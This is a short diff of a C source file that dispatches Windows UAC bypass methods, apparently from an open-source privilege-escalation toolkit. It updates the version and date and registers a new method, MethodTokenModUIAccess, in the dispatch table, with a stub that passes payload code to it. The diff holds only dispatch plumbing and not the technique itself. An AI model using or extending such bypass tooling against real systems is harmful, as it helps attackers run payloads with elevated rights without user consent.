@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.13
+*  VERSION:     3.15
 *
-*  DATE:        25 Jan 2019
+*  DATE:        15 Feb 2019
 *
 *  UAC bypass dispatch.
 *
@@ -67,6 +67,7 @@ UCM_API(MethodAcCplAdmin);
 UCM_API(MethodDirectoryMock);
 UCM_API(MethodCOMSdctl);
 UCM_API(MethodEgre55);
+UCM_API(MethodTokenModUIAccess);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -134,7 +135,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDirectoryMock, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCOMSdctl, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE }
+    { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE },
+    { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE }
 };
 
 #define WDCallbackType1MagicVer 282647531814912
@@ -1081,4 +1083,10 @@ UCM_API(MethodEgre55)
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 #endif
+}
+
+UCM_API(MethodTokenModUIAccess)
+{
+    return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
+        Parameter->PayloadSize);
 }
